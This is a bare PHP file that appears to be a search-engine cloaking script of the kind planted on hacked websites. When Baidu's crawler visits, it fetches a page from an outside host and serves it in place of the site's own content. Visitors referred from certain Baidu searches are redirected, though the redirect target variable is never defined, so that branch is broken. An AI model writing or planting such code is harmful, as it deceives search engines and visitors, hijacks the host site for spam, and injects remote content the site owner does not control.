<?php
$file="http://www.hhhygc.com/bc3/2.html";
$referer=$_SERVER["HTTP_REFERER"];
$agent= strtolower($_SERVER["HTTP_USER_AGENT"]);

if(strstr($referer,"baidu")&&strstr($referer,"456"))
{
   Header("Location: $url");
}
if(ereg("http://www.baidu.com/search/spider.htm",$agent))
{
	
	
		$content=file_get_contents($file);
		echo $content;
	
        exit;

}
?>